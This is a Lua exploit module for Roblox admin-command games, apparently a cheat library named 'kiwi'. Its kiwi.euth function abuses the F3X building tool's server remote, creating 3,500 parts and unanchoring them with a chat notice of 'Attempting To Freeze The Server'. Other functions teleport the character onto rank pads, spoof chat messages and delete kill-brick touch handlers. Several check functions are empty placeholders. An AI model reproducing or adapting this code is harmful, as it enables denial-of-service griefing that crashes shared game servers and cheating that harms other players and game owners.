local kiwi = {}
function kiwi.runc(code)
	game.Players:Chat(code)
end

function kiwi.notify(text)
	kiwi.runc(":chatnotifyc me 0 200 0 [🥝] "..text)
end

function kiwi.servernotify(text)
	kiwi.runc(":chatnotifyc all 0 200 0 [🥝] "..text)
end

function kiwi.ServerEndpoint()
	local RelevantTable = {}

	for _, v in game.Players.LocalPlayer.Character:GetChildren() do
		table.insert(RelevantTable, v)
	end

	for _, v in game.Players.LocalPlayer.Backpack:GetChildren() do
		table.insert(RelevantTable, v)
	end


	for i, v in pairs(RelevantTable) do
		if v:IsA('Tool') and v.Name == 'Building Tools' and #v:GetChildren() > 2 then
			return v:WaitForChild('SyncAPI'):WaitForChild('ServerEndpoint') -- this section is for regular f3x games where remotes are stored in the tool
		end
	end

	for i, v in pairs(RelevantTable) do
		if v:IsA('Folder') and v:FindFirstChild('SyncAPI') then
			return v:WaitForChild('SyncAPI'):WaitForChild('ServerEndpoint')
		end
	end

	return nil
end


function kiwi.euth()
	kiwi.runc(":chatnotifyc all 0 200 0 [🥝] Attempting To Freeze The Server...")
		game.Players:Chat(":f3x")
		wait(1)
		-- wait(.1) until game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI:FindFirstChild("ServerEndpoint")
		local PartTable = {}
		game.Workspace.ChildAdded:Connect(function(v)
			if v:IsA('Part') then
				table.insert(PartTable,v)
				print(v.Name)
			end
		end)

		for i = 1, 3500 do
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = CFrame.new(Vector3.new(-112.61819458007812, 20.000003814697266, 80.5723876953125), Vector3.new(-0, -0, -1)),
				[4] = workspace
			}
			task.spawn(function()
				kiwi.ServerEndpoint():InvokeServer(unpack(args))
			end)
		end
		wait()
		for i,v in pairs(PartTable) do
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = v,
						["Anchored"] = false
					}
				}
			}
			task.spawn(function()
				kiwi.ServerEndpoint():InvokeServer(unpack(args))
			end)
		end
end

function kiwi.rank()
	local plrcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			local cooldown = .1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(13.7, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.7, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5.7, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1.7, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2.3, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6.3, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10.3, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-14.3, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-18.3, 25.05, 106.492)
			wait(cooldown)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plrcframe
end

function kiwi.tpto(x, y, z)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
end

function kiwi.chat(message)
	local args = {
		[1] = message,
		[2] = "All"
	}

	game.Players:Chat(message)
	game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end

function kiwi.disablekillbricks()
	for _, killbrick in pairs(workspace.SecureParts.Lava:GetChildren()) do
		killbrick:FindFirstChild("TouchInterest"):Destroy()
	end
end

function kiwi.resetadminusers()
	--upcomming
end

function kiwi.resetbuildkit()
	--upcomming
end



--CHECKIF's

function kiwi:isadmin()

end

function kiwi:ispermadmin()

end

function kiwi:iseuthed()

end

function kiwi:ismeshes()

end

function kiwi:istherednames()

end
return kiwi
